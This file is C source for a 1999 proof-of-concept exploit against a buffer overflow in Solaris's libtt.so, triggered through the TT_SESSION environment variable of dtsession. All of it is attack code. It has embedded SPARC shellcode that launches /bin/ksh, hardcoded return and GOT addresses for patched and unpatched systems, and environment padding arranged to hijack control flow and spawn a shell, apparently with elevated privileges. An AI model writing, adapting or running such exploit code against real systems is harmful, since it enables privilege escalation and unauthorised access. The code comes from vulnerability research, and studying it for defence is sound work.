/*
 * ovsession.c
 * Job de Haas
 * (C) ITSX BV 1999
 *
 * Some proof of concept code (== really ugly, barely working) at exploiting
 * an overflow in libtt.so when parsing the TT_SESSION string.
 * Only tested on a Solaris 2.6 sun4c sparc, with and without patch 105802-07
 * based loosly on code by horizon <jmcdonal@unf.edu>
 * Somehow the overflow is very sensitive to caching of the stack. To see that
 * it really does work, run it in a debugger and set a break point in tt_open()
 * when that is reached, set a breakpoint in sscanf and continue. When that is
 * reached continue again and it will either crash or execute a shell.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/systeminfo.h>
#include <unistd.h>
#include <string.h>

#define BUF_LEN 280

char exploit[] =
"\220\33\100\15\202\20\40\27\221\323\100\15\220\33\100\17\
\220\2\40\10\320\43\277\370\224\2\40\11\332\52\277\377\
\332\43\277\374\220\33\140\1\202\20\40\6\221\323\100\15\
\220\33\100\15\202\20\40\51\221\323\100\15\320\3\277\370\
\222\43\240\10\224\43\240\4\202\20\40\73\221\323\100\15\
\232\33\100\15\232\33\100\15\232\33\100\15\232\33\100\15\
\232\33\100\15\232\33\100\15\232\33\100\15\232\33\100\15\
\177\377\377\344\232\33\100\15\57\142\151\156\57\153\163\150QQQ";

#if patched
#define got     0xef6d2be0
#else
#define got     0xef6d2f84
#endif

main()
{
    char *argp[6], *envp[20];
    char buf[3072];
    char *ttsess;
    char *display;
    u_long *longp;
    char data[512];
    char padding[64];
    char platform[256];
    int pad=31;
    int i;

    memset(buf,0,3072);
    memset(buf,'a',BUF_LEN);

    longp = (unsigned long *)(buf+BUF_LEN);

    /* %l0 - %l7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;

    /* %i0 - %i7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffff94;      /* make sure %i1 can be used */
    *longp++ = 0xdeadcafe;
    *longp++ = got;             /* also used before we get to the exploit */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffffb0;      /* frame with some necessary values */
    *longp++ = 0xeffffdd0;      /* return into the exploit code */


    longp=(unsigned long *)data;

    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xffffffff;
    *longp++=0xdeadbeef;
    *longp++=0;
    *longp++=0xefffffb4;
    *longp++=0x01;
    *longp++=0xef6dc154;
    *longp++=0xeffffd26;
    *longp++=0x00;

    argp[0] = strdup("/usr/dt/bin/dtsession");
    argp[1] = NULL;

    if (!getenv("DISPLAY")) {
        printf("forgot to set DISPLAY\n");
        exit(1);
    }

    sysinfo(SI_PLATFORM,platform,256);
    pad+=20-strlen(platform)-strlen(argp[0]);

    for (i=0;i<pad;padding[i++]='C')
        padding[i]=0;

    /* create an enviroment size independent of the size of $DISPLAY */
    display = malloc( 8 + strlen(getenv("DISPLAY")) + 1);
    strcpy(display,"DISPLAY=");
    strcat(display+8,getenv("DISPLAY"));
    envp[0] = display;
    envp[1] = malloc(60);
    memset(envp[1], 0, 60);
    memset(envp[1], 'a', 60 - strlen(envp[0]));
    strncpy(envp[1],"W=",2);

    /* put the exploit code in the env space (easy to locate) */
    envp[2] = strdup(exploit);

    /* create the overflow string */
    ttsess = strdup("TT_SESSION=01 18176 1289637086 1 0 1000 %s 4");
    envp[3] = malloc( strlen(ttsess) + strlen(buf));
    sprintf(envp[3],ttsess,buf);

    /* make it easier to debug, probably smarter ways to do this */
    envp[4] = strdup("LD_BIND_NOW=1   ");

    /* put some data in the environment to keep the code running after the
       overflow, but before the return pointer is used. includes NULL ptrs */
    envp[5]=(data);
    envp[6]="";
    envp[7]="";
    envp[8]="";
    envp[9]=&(data[32]);
    envp[10]="";
    envp[11]="";
    envp[12]=&(data[39]);
    envp[13]="";
    envp[14]="";
    envp[15]="\010";
    envp[16]=padding;
    envp[17]=NULL;

    execve("/usr/dt/bin/dtsession",argp,envp);

}
